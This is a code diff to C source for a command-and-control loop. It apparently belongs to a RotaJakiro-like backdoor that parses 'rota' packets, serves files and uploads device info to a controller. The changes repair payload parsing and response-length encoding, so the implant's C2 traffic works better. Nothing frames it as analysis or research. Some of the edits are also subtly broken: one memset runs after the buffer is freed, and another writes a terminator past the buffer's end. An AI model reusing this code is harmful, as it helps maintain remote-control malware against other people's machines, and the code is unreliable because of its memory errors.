@@ -179,6 +179,8 @@ void c2_loop() {
                 char *msg = "file does not exist";
                 build_c2_response(msg, cmd_id, sock2);
             }
+
+            memset(payload, 0, payload_length);
         }
         else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
             #ifdef DEBUG
@@ -278,6 +280,7 @@ void c2_loop() {
         free(payload);
         free(cmd_id);
         memset(buffer, 0, strlen(buffer));
+        memset(payload, 0, payload_length);
         close(sock);
     }
 
@@ -500,8 +503,9 @@ char *parse_c2_payload( char *buffer, int length) {
         payload = "error allocating data";
         return payload;
     }
-    memset(payload, 0, sizeof payload);
+    memset(payload, 0, length);
     // copy last N-bytes from rota payload
+    payload[length] = '\0';
     memcpy(payload, &buffer[82], length);
     return payload;
 }
@@ -512,14 +516,11 @@ void build_c2_response(char *buffer, char *cmd_id, int sock){
 
     // correct length of payload on buffer
     int buffer_len = strlen(buffer);
-    char buffer_len_hex[8] = {0x00};
 
     // bytes 4->8 session id
     memcpy(&rota_resp_pkt[4], sessionId, sizeof(sessionId));
 
-    // convert and store integer in rota header
-    sprintf(buffer_len_hex, "%x", buffer_len);
-    memcpy(&rota_resp_pkt[8], buffer_len_hex, sizeof(buffer_len_hex));
+    memcpy(&rota_resp_pkt[8], &buffer_len, 4);
 
     // update cmd_id in response packet
     memcpy(&rota_resp_pkt[14], cmd_id, 4);
